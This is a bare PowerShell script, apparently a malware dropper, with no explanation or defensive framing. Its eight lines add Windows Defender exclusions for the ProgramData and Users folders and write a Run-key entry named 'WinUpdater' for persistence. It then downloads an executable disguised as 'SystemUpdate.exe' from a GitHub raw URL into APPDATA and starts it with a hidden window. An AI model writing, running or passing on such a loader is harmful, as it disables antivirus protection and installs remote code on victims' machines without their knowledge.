Add-MpPreference -ExclusionPath "C:\ProgramData" -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "C:\Users" -ErrorAction SilentlyContinue
$p = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WinUpdater' -Value $p
$u = "https://github.com/srap18/ddoss/raw/refs/heads/main/SystemUpdate.exe"
$o = "$env:APPDATA\win_sys_service.exe"
(New-Object System.Net.WebClient).DownloadFile($u, $o)
Start-Process $o -WindowStyle Hidden